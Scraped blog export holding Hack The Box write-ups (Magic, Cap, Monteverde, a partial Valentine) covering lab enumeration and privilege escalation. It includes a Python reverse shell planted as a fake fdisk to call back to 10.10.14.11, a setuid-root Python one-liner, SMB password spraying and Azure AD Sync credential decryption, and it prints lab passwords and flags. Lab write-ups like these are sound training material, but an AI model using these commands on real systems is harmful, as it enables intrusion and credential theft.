FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can’t access tty; job control turned off\n$ id uid=33(www-data) gid=33(www-data) groups=33(www-data)\nUPGRADE THE SHELL\nDo standard enumeration with linPEAs.sh and we find a few interesting things.\nMySQL running locally on the box and the password used: tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN -\n[+] Finding ‘pwd’ or ‘passw’ variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70) .. /var/www/Magic/db.php5: private static $dbUserPassword = ‘iamkingtheseus’;\n\nFurther investigation of the db-file we find dbName and dbUsername: www-data@ubuntu:/tmp$ cat /var/www/Magic/db.php5 &lt;?php class Database { private static $dbName = ‘Magic’ ; private static $dbHost = ‘localhost’ ; private static $dbUsername = ‘theseus’; private static $dbUserPassword = ‘iamkingtheseus’;\n\nDump the contents of the database using mysqldump and we find another password.\nwww-data@ubuntu:/tmp$ mysqldump Magic -u theseus -p Enter password: – MySQL dump 10.13 Distrib 5.7.29, for Linux (x86_64) – – Host: localhost Database: Magic – —————————————————— .. INSERT INTO login VALUES (1,‘admin’,‘Th3s3usW4sK1ng’);\nSSH is only possible with public key, so change user with ‘su theseus’ to grab user.txt and add your public key to authorized_keys\nwww-data@ubuntu:/tmp$ su theseus Password: theseus@ubuntu:~$ id uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users) theseus@ubuntu:~$ cat user.txt 87a9eb3d4c4b7c0a77f9acdf124eed65\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nBasic enumeration with linPEAs is sparse, but /bin/sysinfo is readable and stands out from the crowd.\n[+] Readable files belonging to root and readable by me but not world readable -rwsr-x— 1 root users 22040 Oct 21 2019 /bin/sysinfo\nRunning the program give us system information. To know exactly how we dig deeper with strings and find following commands:\ntheseus@ubuntu:/bin$ strings sysinfo .. ====================Hardware Info==================== lshw -short ====================Disk Info==================== fdisk -l ====================CPU Info==================== cat /proc/cpuinfo ====================MEM Usage===================== free -h\nTry to run all the command manually and we notice that “fdisk” won’t print any output due to low privs. Root is probably needed, although this data got printed when executing “sysinfo”.\nFind where fdisk is located using fdisk, to see if we can do some simple PATH hijacking.\ntheseus@ubuntu:/dev/shm$ which fdisk /sbin/fdisk\ntheseus@ubuntu:/dev/shm$ echo $PATH | tr “:” “” | nl 1 /usr/local/sbin 2 /usr/local/bin 3 /usr/sbin 4 /usr/bin 5 /sbin 6 /bin 7 /usr/games 8 /usr/local/games 9 /snap/bin\n/sbin is only on position 5, however none of the above directories is writable from Theseus.\nModify PATH and place your own, malicious, fdisk program.\ntheseus@ubuntu:/dev/shm$ export PATH=/dev/shm:\\(PATH\ntheseus@ubuntu:/dev/shm\\) echo $PATH | tr “:” “” | nl 1 /dev/shm 2 /usr/local/sbin 3 /usr/local/bin 4 /usr/sbin 5 /usr/bin 6 /sbin 7 /bin 8 /usr/games 9 /usr/local/games 10 /snap/bin\ntheseus@ubuntu:/dev/shm$ cat fdisk python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.14.11”,4499));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,“-i”]);’\nRun /bin/sysinfo to trigger your malicious file and get a root-shell.\ntheseus@ubuntu:/dev/shm$ /bin/sysinfo\nroot@nidus:/opt/shells# nc -lvnp 4499 listening on [any] 4499 … connect to [10.10.14.11] from (UNKNOWN) [10.10.10.185] 38338 # whoami root # cat /root/root.txt a69ddb35ff2bf4ada26508463f841344\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nLogin Bypass https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/\nPATH https://www.cyberciti.biz/faq/howto-print-path-variable/"
  },
  {
    "objectID": "posts/2021-06-18-htb-writeup-cap/2021-06-18-htb-writeup-cap.html",
    "href": "posts/2021-06-18-htb-writeup-cap/2021-06-18-htb-writeup-cap.html",
    "title": "Cap - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/cap]# nmap -Pn -n -sCV –open 10.10.10.245 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA) | 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA) |_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519) 80/tcp open http gunicorn | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 NOT FOUND | Server: gunicorn | Date: Fri, 18 Jun 2021 07:14:58 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 232 | &lt;!DOCTYPE HTML PUBLIC “-//W3C//DTD HTML 3.2 Final//EN”&gt; |\n\n404 Not Found\n\n|\n\nNot Found\n\n|\n\nThe requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.\n\n| GetRequest: | HTTP/1.0 200 OK | Server: gunicorn | Date: Fri, 18 Jun 2021 07:14:52 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 19386 | &lt;!DOCTYPE html&gt; |\n\n    \n\nDIRB + http://10.10.10.245/data (CODE:302|SIZE:208) + http://10.10.10.245/ip (CODE:200|SIZE:17451) + http://10.10.10.245/netstat (CODE:200|SIZE:30019)\nNIKTO + Allowed HTTP Methods: OPTIONS, GET, HEAD\nUser - Nathan\n\nVisiting the HTTP we instantly see user ‘Nathan’, and a few IP functions - netstat, ifconfig and a capture counter. The capture have all it’s values to 0, and whatever we do towards the host they don’t move.\n\nLooking at the url, http://10.10.10.245/data/1, we can change the value ‘1’ to ‘0’ in hope to find a earlier batch of data. This work and we can see that the counters are now 72,69,69,0. Download the .pcap file and go through it in Wireshark.\n\nOnce opened the .pcap we can quickly see requests and responses regarding user Nathan. Right click, Follow &gt; TCP Stream and we get this output:\n\n220 (vsFTPd 3.0.3) USER nathan 331 Please specify the password. PASS Buck3tH4TF0RM3! 230 Login successful. SYST 215 UNIX Type: L8 PORT 192,168,196,1,212,140 200 PORT command successful. Consider using PASV. LIST 150 Here comes the directory listing. 226 Directory send OK. PORT 192,168,196,1,212,141 200 PORT command successful. Consider using PASV. LIST -al 150 Here comes the directory listing. 226 Directory send OK. TYPE I 200 Switching to Binary mode. PORT 192,168,196,1,212,143 200 PORT command successful. Consider using PASV. RETR notes.txt 550 Failed to open file. QUIT 221 Goodbye.\nSweet, we now have creds to vsFTP! Nathan:Buck3tH4TF0RM3! Before digging deeper into vsFTP, I always tend to try the creds towards SSH incase that would give us a easy user.\n[root:/git/htb/cap]# ssh nathan@10.10.10.245 (master✱) nathan@10.10.10.245’s password: Buck3tH4TF0RM3! nathan@cap:~$ whoami nathan nathan@cap:~$ cat user.txt ae160eb3719c987efe6e0eebaf2a6574\nEasy user, great!\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nAs usual, start with the easy ‘sudo -l’ to see if we can get easy root.\n\nnathan@cap:~$ sudo -l [sudo] password for nathan: Sorry, user nathan may not run sudo on cap.\nNo luck, after some manual enumeration I couldn’t find anything obvious - so fire up linpeas.\nnathan@cap:/dev/shm$ ./linpeas.sh .. [+] Capabilities [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip /usr/bin/ping = cap_net_raw+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep\nCapabilities is new to me, something I’ve never heard about and fits the name of the box ‘Cap’. Reading about Capabilities we find: &gt; Capabilities are useful when you want to restrict your own processes after performing privileged operations &gt; (e.g. after setting up chroot and binding to a socket). However, they can be exploited by passing them malicious &gt; commands or arguments which are then run as root.\nCAP_SETUID = Allow changing of the UID (set UID of root in you process) CAP_NET_BIND_SERVICE = Bind a socket to internet domain privileged ports CAP_NET_RAW = Use RAW and PACKET sockets (sniff traffic)\nWith this knowledge, python3.8 has the capabilities to setuid to 0, giving us root access. We can do this in a simple one-liner.\nnathan@cap:~$ /usr/bin/python3.8 -c ‘import os; os.setuid(0); os.system(“/bin/bash”);’ root@cap:~# id && cat /root/root.txt uid=0(root) gid=1001(nathan) groups=1001(nathan) cd9a6e65fc62abbc53c91c6f7b803822\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nExploit Capabilities: https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#malicious-use"
  },
  {
    "objectID": "posts/2020-01-21-htb-writeup-monteverde/2020-01-21-htb-writeup-monteverde.html",
    "href": "posts/2020-01-21-htb-writeup-monteverde/2020-01-21-htb-writeup-monteverde.html",
    "title": "Monteverde - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@p3:/opt/htb/machines/monteverde# nmapAutomatorDirb.sh 10.10.10.172 All PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49670/tcp open msrpc Microsoft Windows RPC 49673/tcp open msrpc Microsoft Windows RPC 49702/tcp open msrpc Microsoft Windows RPC 49771/tcp open msrpc Microsoft Windows RPC\nPORT STATE SERVICE VERSION 53/udp open domain (generic dns response: SERVFAIL) 123/udp open ntp NTP v3 389/udp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows Domain: Megabank.local0\nEnum domain users with rpcclient. root@p3:/opt/htb/machines/monteverde# rpcclient -U “” 10.10.10.172 rpcclient $&gt; enumdomusers user:[Guest] rid:[0x1f5] user:[AAD_987d7f2f57d2] rid:[0x450] user:[mhope] rid:[0x641] user:[SABatchJobs] rid:[0xa2a] user:[svc-ata] rid:[0xa2b] user:[svc-bexec] rid:[0xa2c] user:[svc-netapp] rid:[0xa2d] user:[dgalanos] rid:[0xa35] user:[roleary] rid:[0xa36] user:[smorgan] rid:[0xa37]\nEnumerate each account (queryuser) and we find that mhope (Mike Hope) and AAD_987d7f2f57d2 is the only accounts with a login_count higher then 0. AAD_987d7f2f57d2 has an interesting description, giving us an installation identifier.\nrpcclient $&gt; queryuser 0x450 User Name : AAD_987d7f2f57d2 Full Name : AAD_987d7f2f57d2 .. Description : Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE. .. user_rid : 0x450 group_rid: 0x201 .. logon_count: 0x00000009 ..\nWe are unable to get any account hashes using Impacket GetNPUsers.py as the accounts doesn’t have UF_DONT_REQUIRE_PREAUTH.\nEnumerate SMB. We are unable to get any info using smbclient and anonymous login. Using msf we can enumerate the accounts with found users. As we don’t have any passwords yet we try to set ‘USER_AS_PASS’ as TRUE.\nmsf5 auxiliary(scanner/smb/smb_login) &gt; options Name Current Setting Required Description —- ————— ——– ———– RHOSTS 10.10.10.172 yes The target host(s), range CIDR identifier, or hosts file with syntax ‘file:’ RPORT 445 yes The SMB service port (TCP) SMBDomain megabank.local no The Windows domain to use for authentication USER_AS_PASS true no Try the username as the password for all users USER_FILE users-monteverde.txt no File containing usernames, one per line\nmsf5 auxiliary(scanner/smb/smb_login) &gt; run\n[*] 10.10.10.172:445 - 10.10.10.172:445 - Starting SMB login bruteforce .. [-] 10.10.10.172:445 - 10.10.10.172:445 - Failed: ‘megabank.local:mhope’, [+] 10.10.10.172:445 - 10.10.10.172:445 - Success: ‘megabank.local:SABatchJobs’ [-] 10.10.10.172:445 - 10.10.10.172:445 - Failed: ‘megabank.local-ata:svc-ata’, ..\nWe find one matching credential for SMB - SABatchJobs:SABatchJobs\nEnumerate SMB further using smbclient and the found credentials. root@p3:/opt/htb/machines/monteverde# smbclient -L 10.10.10.172 -U SABatchJobs Enter WORKGROUP’s password:\n Sharename       Type      Comment\n ---------       ----      -------\n ADMIN$          Disk      Remote Admin\n azure_uploads   Disk\n C$              Disk      Default share\n E$              Disk      Default share\n IPC$            IPC       Remote IPC\n NETLOGON        Disk      Logon server share\n SYSVOL          Disk      Logon server share\n users$          Disk\nThe share ‘azure_uploads’ is empty, however looking in ’users\\(' we find an interesting .xml containing a password.\n   root@p3:/opt/htb/machines/monteverde# smbclient \\\\\\\\10.10.10.172\\\\users\\) -U SABatchJobs smb: &gt; dir . D 0 Fri Jan 3 14:12:48 2020 .. D 0 Fri Jan 3 14:12:48 2020 dgalanos D 0 Fri Jan 3 14:12:30 2020 mhope D 0 Fri Jan 3 14:41:18 2020 roleary D 0 Fri Jan 3 14:10:30 2020 smorgan D 0 Fri Jan 3 14:10:24 2020 smb: &gt; cd mhope smb: &gt; dir . D 0 Fri Jan 3 14:41:18 2020 .. D 0 Fri Jan 3 14:41:18 2020 azure.xml AR 1212 Fri Jan 3 14:40:23 2020\nroot@p3:/opt/htb/machines/monteverde# cat azure.xml .. 4n0therD4y@n0th3r$ ..\nNOTE: Credentials - mhope:4n0therD4y@n0th3r$\nLogin with evil-winrm using found credentials for mhope, grab user.txt. root@p3:/opt/htb/machines/monteverde# evil-winrm -i monteverde.htb -u mhope -p 4n0therD4y@n0th3r$ Evil-WinRM PS C:&gt; type user.txt 4961****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nLooking at the directory of mhope we find the dir .Azure hinting that this privesc should/have somnething to do with Azure. We find a TokenCache containing lots of information that might be valuable. Also something called ‘Microsoft Azure AD Sync’ in C:Files.\nEnumerating the box further tells us that it’s running sqlserver locally (tcp 1433), this sounds like a promising point to start.\nEvil-WinRM PS C:&gt; netstat -aon Active Connections Proto Local Address Foreign Address State PID .. TCP 0.0.0.0:1433 0.0.0.0:0 LISTENING 3512 .. TCP 10.10.10.172:1433 10.10.10.172:49720 ESTABLISHED 3512 TCP 10.10.10.172:1433 10.10.10.172:49721 ESTABLISHED 3512 TCP 10.10.10.172:1433 10.10.10.172:49722 ESTABLISHED 3512 TCP 10.10.10.172:1433 10.10.10.172:49723 ESTABLISHED 3512 TCP 10.10.10.172:1433 10.10.10.172:49724 ESTABLISHED 3512\nReading about Azure AD Sync it is the service responsible for syncing data between your local domain and the Azure based domain. The service needs privileged credentials from the local domain in order to sync, meaning this could potentially be exploited.\nGoogling “Azure AD sync exploit” we find an article explaining how to Priv Esc using Azure AD Connect Database, and even has a compiled program to do it for you, see link below under ‘Information’.\nDownload the program and upload the .exe and .dll to the vicitm host (C:) In order for the program to work we need to ‘stand’ in the ADSync directory.\nEvil-WinRM PS C:&gt; dir\n  Directory: C:\\temp\\AdDecrypt\n\n\n\nMode\nLastWriteTime\nLength\nName\n\n\n\n\n-a—- 1/22/2\n020 12:29 AM\n14848\nAdDecrypt.exe\n\n\n-a—- 1/22/2\n020 12:29 AM\n334248\nmcrypt.dll\n\n\n\nEvil-WinRM PS C:&gt; cd C:\"Program Files”\"Microsoft Azure AD Sync” Evil-WinRM PS C:FilesAzure AD Sync&gt; Evil-WinRM PS C:FilesAzure AD Sync&gt; C:.exe -FullSQL\n====================== AZURE AD SYNC CREDENTIAL DECRYPTION TOOL Based on original code from: https://github.com/fox-it/adconnectdump ======================\nOpening database connection… Executing SQL commands… Closing database connection… Decrypting XML… Parsing XML… Finished!\nDECRYPTED CREDENTIALS: Username: administrator Password: d0m@in4dminyeah! Domain: MEGABANK.LOCAL\nNOTE: If the program doesn’t work, try to import the ADSync module and run it again. Import-Module ADSync Also, the .exe is polling SQL with “Server=LocalHost;Database=ADSync;Trusted_Connection=True;”. Luckily this is the exact structure of the database on Monteverde box, in other circumstances we would need to re-compile the .exe.\nLogin with found admin credentials and grab root.txt\nroot@p3:/opt/htb/machines/monteverde# evil-winrm -i monteverde.htb -u administrator -p d0m@in4dminyeah! Evil-WinRM PS C:&gt; whoami megabank Evil-WinRM PS C:&gt; type root.txt 1290****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nPrivEsc, ADSync Exploit https://vbscrub.video.blog/2020/01/14/azure-ad-connect-database-exploit-priv-esc/"
  },
  {
    "objectID": "posts/2021-03-15-htb-writeup-valentine/2021-03-15-htb-writeup-valentine.html",
    "href": "posts/2021-03-15-htb-writeup-valentine/2021-03-15-htb-writeup-valentine.html",
    "title": "Valentine - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\nDIRB: + http://10.10.10.79/cgi-bin/ (CODE:403|SIZE:287) + http://10.10.10.79/decode (CODE:200|SIZE:552) ==&gt; DIRECTORY: http://10.10.10.79/dev/ + http://10.10.10.79/encode (CODE:200|SIZE:554) + http://10.10.10.79/index (CODE:200|SIZE:38) + http://10.10.10.79/index.php (CODE:200|SIZE:38) + http://10.10.10.79/server-status (CODE:403|SIZE:292)"
  },
  {
    "objectID": "posts/2021-03-15-htb-writeup-valentine/2021-03-15-htb-writeup-valentine.html#nikto",
    "href": "posts/2021-03-15-htb-writeup-valentine/2021-03-15-htb-writeup-valentine.html#nikto",
    "title": "Valentine - Hack The Box",
    "section": "NIKTO:",
    "text": "NIKTO:\n\nVisiting http://10.10.10.79 we find a image of a lady screaming and a bleeding heart. Downloading the image and binwalk it gives us nothing.\nIn http://10.10.10.79/dev/ we find ‘hype_key’ and ‘notes.txt’.\n\n[root:/git/htb/valentine]# curl http://10.10.10.79/dev/notes.txt (master✱) To do:\n\nCoffee.\nResearch.\nFix decoder/encoder before going live.\nMake sure encoding/decoding is only done client-side.\nDon’t use the decoder/encoder until any of this is done.\nFind a better way to take notes.\n\nFrom the notes it sounds like we had a tired and unknowing developer. He’s talking about encoder/decoder, which dirb found for us. Maybe we can inject some code there.\n[root:/git/htb/valentine]# curl http://10.10.10.79/dev/hype_key (master✱) 2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 